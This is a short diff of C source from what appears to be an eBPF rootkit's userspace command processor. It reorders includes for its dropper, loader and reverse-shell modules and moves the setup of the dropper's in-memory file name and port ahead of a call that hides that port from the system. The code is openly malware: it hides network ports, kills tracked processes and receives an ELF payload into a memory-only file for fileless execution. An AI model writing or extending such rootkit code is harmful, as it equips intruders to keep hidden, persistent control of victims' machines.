@@ -10,9 +10,9 @@
 #include "config.h"
 #include "rootkit.skel.h"
 #include "userspace/command_processor.h"
+#include "userspace/dropper.h"
 #include "userspace/loader.h"
 #include "userspace/reverse_shell.h"
-#include "userspace/dropper.h"
 
 /**
  * @brief Kill all tracked PIDs from eBPF map
@@ -136,12 +136,13 @@ static int receive_elf_from_dropper(command_processor_context_t *command_process
 
     int ret = 0;
 
+    command_processor_ctx->dropper_ctx.memory_file_fd = -1;
+    command_processor_ctx->dropper_ctx.memory_file_name = DROPPER_MEMFD_NAME;
+    command_processor_ctx->dropper_ctx.dropper_port = DROPPER_PORT;
+
     ret = hider_hide_port(command_processor_ctx->hider_ctx, DROPPER_PORT);
     if (ret != 0)
         return ret;
-
-    command_processor_ctx->dropper_ctx.memory_file_fd = -1;
-    command_processor_ctx->dropper_ctx.memory_file_name = "drop";
 
     ret = dropper_receive(&command_processor_ctx->dropper_ctx);
     if (ret)
